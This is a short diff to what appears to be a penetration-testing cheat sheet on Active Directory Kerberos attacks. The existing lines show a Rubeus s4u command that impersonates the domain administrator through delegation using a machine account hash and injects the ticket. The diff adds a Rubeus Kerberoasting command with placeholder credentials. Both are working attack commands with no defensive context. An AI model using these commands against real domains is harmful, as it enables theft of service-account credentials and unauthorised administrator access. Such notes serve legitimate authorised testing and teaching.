@@ -22,3 +22,9 @@ And finally we can use Rubeus' *s4u* module to get a service ticket for the serv
 ```powershell
 Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt
 ```
+
+
+Kerberoast
+```powershell
+.\Rubeus.exe kerberoast /creduser:$domain.$tld\$user /credpassword:Password123! /nowrap
+```
